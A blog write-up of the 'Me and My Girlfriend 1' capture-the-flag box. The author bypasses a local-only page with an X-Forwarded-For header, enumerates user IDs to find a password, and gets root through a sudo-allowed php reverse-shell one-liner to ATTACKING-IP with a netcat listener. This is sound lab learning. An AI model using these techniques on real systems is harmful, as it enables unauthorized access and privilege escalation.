---
title: "Me and My Girlfriend 1 Writeup"
date: 2020-02-16T19:09:19+11:00
description: "Writeup for Me and My Girlfriend 1 box"
draft: false
displayInLine: true
displayInMenu: true
draft: false
---

# Me and My Girlfriend Write-up 1

For this box, the overall objective is the break into Alice's account, find her secret (flag1.txt) and then gain root access (flag2.txt). When booting up the VM your greeted with a standard ubuntu login. Since no SQL injections work on this login, I need to find the IP of this machine to begin an NMAP scan.

To do this, I use the following command on my kali machine:

    netdiscover -r 192.168.220.0
    
    # -r = range of ips

This will allow me to detect any IP that exists in this range.

<figure>
<img src="/img/meand.png" >
<figcaption>
*Result of the netdiscover command*
</figcaption>
</figure>

As seen there are 4 IPs shown, only one of these is the IP of the Alice machine. since *.1* and *.254* are the network and broadcast IP respectively, these leaves *.156* and *.2* but *.2* is most likely the gateway address.

I can further test this by performing and NMAP scan on the IP 192.168.220.156.

    nmap -A 192.168.220.156

<figure>
<img src="/img/Untitled one.png" >
<figcaption>
*NMAP results*
</figcaption>
</figure>

Boom so now I know that there are 2 open ports I can use. But one of them being port 80 with an apache version shows that there's a website. So now I'm going to see if I can access the website normally.

<figure>
<img src="/img/Untitled 2.png" >
<figcaption>
*Viewed website on port 80*
</figcaption>
</figure>

So we are greeted with this kind message telling that the site can only be accessed locally. So lets see if theres anything else.

<figure>
<img src="/img/Untitled 3.png" >
<figcaption>
*Results in inspector*
</figcaption>
</figure>

There's a comment here saying that we should look up how to use x-forwarded-for

<figure>
<img src="/img/Untitled 4.png" >
<figcaption>
*Search results for X-Forwarded-For*
</figcaption>
</figure>

So what we've gathered is that X-Forwarded-For is a HTTP header field. So from this lets have a look at the header field for the website by using **Burp Suite**

So before setting it up I have to make the necessary changes to Firefox

<figure>
<img src="/img/Untitled 5.png" >
<figcaption>
*Configuration for Burp Suite*
</figcaption>
</figure>

<figure>
<img src="/img/Untitled 6.png" >
</figure>

<figure>
<img src="/img/Untitled 7.png" >
</figure>

- So we have to change the proxy setting in Firefox to be the same as the proxy listener in Burp Suite. By going to the bottom of preferences in Network Proxy and changing the configure proxy to manual and inputting the HTTP Proxy as the same IP and Port: *127.0.0.1 8080 .*

Now that this is configured we can refresh the page and capture the page.

<figure>
<img src="/img/Untitled 8.png" >
<figcaption>
*Captured results from the page*
</figcaption>
</figure>

So once we captured it, we can see the data it is able to capture in the refresh. If we navigate to headers we can see what information the headers have.

<figure>
<img src="/img/Untitled 9.png" >
</figure>

This is the header info for the site. So if we were to insert the X-Forwarder-For somewhere we should able to access local. 

<figure>
<img src="/img/Untitled 10.png" >
<figcaption>
*Configuring Burp options to input the X-Forwarded-For header*
</figcaption>
</figure>
Inserting that should allow us to gain access to local given the two hints.

    X-Forwarded-For: localhost

<figure>
<img src="/img/Untitled 11.png" >
<figcaption>
*Header inputted*
</figcaption>
</figure>

<figure>
<img src="/img/Untitled 12.png" >
<figcaption>
*Resulting change from header addition*
</figcaption>
</figure>

Perfect, I gained access to the proper page. Now let’s have a look around.

There was nothing of notability so now I’m going to register to see if there anything else.

<figure>
<img src="/img/Untitled 13.png" >
<figcaption>
*Homepage dashboard*
</figcaption>
</figure>

Now that I've registered I'm going to look around for potential clues.

<figure>
<img src="/img/Untitled 14.png" >
<figcaption>
*Registered as a user, then played around with the user_id in URL*
</figcaption>
</figure>

I started playing around with the user_id in the url to see if it changes anything. and so it does. Now im just going to input random numbers and see where it goes.

<figure>
<img src="/img/Untitled 15.png" >
<figcaption>
*Found Alice account*
</figcaption>
</figure>

Bingo, Alice. Now that we found her profile, we need to find out the password.

<figure>
<img src="/img/Untitled 16.png" >
<figcaption>
*Source-code showing her password*
</figcaption>
</figure>v

In the source code we’ve got the username and password,

    alice
    4lice3

Now to use this password on the Alice machine.

<figure>
<img src="/img/Untitled 17.png" >
<figcaption>
*Logging into her account on the machine*
</figcaption>
</figure>

Were in, now lets dig in and find the flag

<figure>
<img src="/img/Untitled 18.png" >
<figcaption>
*Secret and Flag 1 found*
</figcaption>
</figure>
So now we've got the first flag within a hidden file. Now we need to get root access to get the second flag.

So I didn't know where to go from here so I tried to find out what sudo command that Alice can use.

<figure>
<img src="/img/Untitled 19.png" >
<figcaption>
*Looked at what sudo command the user Alice can execute*
</figcaption>
</figure>
    sudo -l
    -l = list of If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.

Using the above command, I can determine that the Alice user can use the following command as root:

    /usr/bin/php

Now I need to figure a way to exploit this to gain root access.

After doing some researching into it, I found a cheat sheet for reverse shells and found this command:

    php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'

This alongside netcat should allow me to gain access through the kali machine using the following command

    nc -nvlp 80

<figure>
<img src="/img/Untitled 20.png" >
<figcaption>
*Kali machine listening on port 5050*
</figcaption>
</figure>
<figure>
<img src="/img/Untitled 21.png" >
<figcaption>
*Executing the exploit on Alice machine*
</figcaption>
</figure>
<figure>
<img src="/img/Untitled 22.png" >
<figcaption>
*Kali machine connected to the opening and viewed what user I was*
</figcaption>
</figure>
Boom now I'm root, now I just need to navigate to the second flag.

<figure>
<img src="/img/Untitled 23.png" >
<figcaption>
*Viewed flag2 as root*
</figcaption>
</figure>
